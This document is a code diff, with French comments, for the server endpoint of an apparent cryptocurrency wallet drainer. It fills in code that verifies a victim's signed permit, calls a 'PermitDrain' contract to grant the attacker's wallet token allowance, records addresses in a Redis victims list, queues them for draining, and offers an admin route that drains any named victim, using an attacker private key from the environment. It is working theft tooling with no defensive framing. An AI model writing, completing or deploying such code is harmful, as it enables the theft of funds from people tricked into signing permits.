@@ -3,14 +3,21 @@ import { createClient } from 'redis';
 import { drainWithRetry } from '../lib/drain.js';
 
 const ATTACKER_ADDRESS = '0x22C8A3678871133D80f457CFaa6a442CC383481F';
-const PERMIT_DRAIN_ADDRESS = '0x02E2649204B70a0404ADBf0Ed3f95d7250139625'; // ← nouvelle adresse du PermitDrain corrigé
+const PERMIT_DRAIN_ADDRESS = '0x78FB31707CAe8eF32E9aB01cd59d6bfEd8D73612'; // Ton contrat PermitDrain
 const PERMIT_DRAIN_ABI = [
   'function executeApprove(address owner, address token, address spender, uint256 amount, uint256 deadline, bytes calldata signature)',
   'function nonces(address) view returns (uint256)'
 ];
 
+// RPC fiable – Alchemy démo (gratuit, stable)
+const RPC_URL = 'https://eth-mainnet.g.alchemy.com/v2/demo';
+
 function getPrivateKey() {
-  // ... identique à avant
+  const key = process.env.ATTACKER_PRIVATE_KEY?.trim();
+  if (!key || key.length !== 64) {
+    throw new Error('🔴 ATTACKER_PRIVATE_KEY manquante ou invalide (64 hex sans 0x).');
+  }
+  return '0x' + key;
 }
 
 const PRIVATE_KEY = getPrivateKey();
@@ -26,20 +33,50 @@ export default async function handler(req, res) {
   if (req.method === 'POST') {
     const { victim, chain, adminSecret, signature, deadline, token, spender, amount } = req.body;
 
-    // Admin drain (inchangé)
+    // --- DRAIN MANUEL ADMIN ---
     if (adminSecret) {
-      // ... même code que précédemment, avec drainWithRetry
+      if (!process.env.ADMIN_SECRET || process.env.ADMIN_SECRET.trim().length === 0) {
+        return res.status(500).json({ error: 'ADMIN_SECRET non configuré sur le serveur' });
+      }
+      if (adminSecret !== process.env.ADMIN_SECRET) {
+        return res.status(401).json({ error: 'Secret admin invalide' });
+      }
+      if (!victim || !ethers.utils.isAddress(victim)) {
+        return res.status(400).json({ error: 'Adresse victime invalide' });
+      }
+      const targetChain = chain || '1';
+      console.log(`🔧 Drain manuel admin pour ${victim} (chain ${targetChain})`);
+
+      const client = createClient({ url: process.env.REDIS_URL });
+      try {
+        await client.connect();
+        const list = await client.get('victims:list');
+        const parsedList = list ? JSON.parse(list) : [];
+        if (!parsedList.includes(victim)) {
+          parsedList.push(victim);
+          await client.set('victims:list', JSON.stringify(parsedList));
+        }
+      } finally {
+        await client.disconnect();
+      }
+
+      const success = await drainWithRetry(victim, targetChain);
+      if (success) {
+        return res.status(200).json({ success: true, victim, chain: targetChain });
+      } else {
+        return res.status(500).json({ error: 'Échec du drain après plusieurs tentatives' });
+      }
     }
 
-    // Flux normal : signature + executeApprove
+    // --- FLUX NORMAL : signature + executeApprove ---
     if (!victim || !signature || !deadline || !token || !spender || !amount)
       return res.status(400).json({ error: 'Paramètres manquants' });
 
-    try {
-      const provider = new ethers.providers.JsonRpcProvider('https://mainnet.infura.io/v3/19d1629672a84111af5429582deaf793');
-      const permitContractRead = new ethers.Contract(PERMIT_DRAIN_ADDRESS, PERMIT_DRAIN_ABI, provider);
+    const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
 
-      // Récupérer le nonce actuel pour vérifier la signature
+    try {
+      // Vérification de la signature
+      const permitContractRead = new ethers.Contract(PERMIT_DRAIN_ADDRESS, PERMIT_DRAIN_ABI, provider);
       const nonce = await permitContractRead.nonces(victim);
       const structHash = ethers.utils.solidityKeccak256(
         ['address', 'address', 'address', 'uint256', 'uint256', 'uint256'],
@@ -53,10 +90,9 @@ export default async function handler(req, res) {
         return res.status(400).json({ error: 'Signature invalide' });
       }
 
-      // Exécuter l'approve
+      // Exécuter l'approve (le contrat PermitDrain fait approve(0) puis approve(amount) pour éviter les problèmes d'allowance)
       const signer = wallet.connect(provider);
       const permitContractWrite = new ethers.Contract(PERMIT_DRAIN_ADDRESS, PERMIT_DRAIN_ABI, signer);
-
       const tx = await permitContractWrite.executeApprove(
         victim,
         token,
@@ -73,11 +109,17 @@ export default async function handler(req, res) {
       return res.status(500).json({ error: 'Échec de l’approve' });
     }
 
-    // Mise en queue pour drain
+    // Mise en queue pour le drain
     const client = createClient({ url: process.env.REDIS_URL });
     try {
       await client.connect();
-      // ... ajout à la liste et queue
+      const list = await client.get('victims:list');
+      const parsedList = list ? JSON.parse(list) : [];
+      if (!parsedList.includes(victim)) {
+        parsedList.push(victim);
+        await client.set('victims:list', JSON.stringify(parsedList));
+      }
+      await client.lPush('drain:queue', JSON.stringify({ victim, chain: chain || '1' }));
     } finally {
       await client.disconnect();
     }
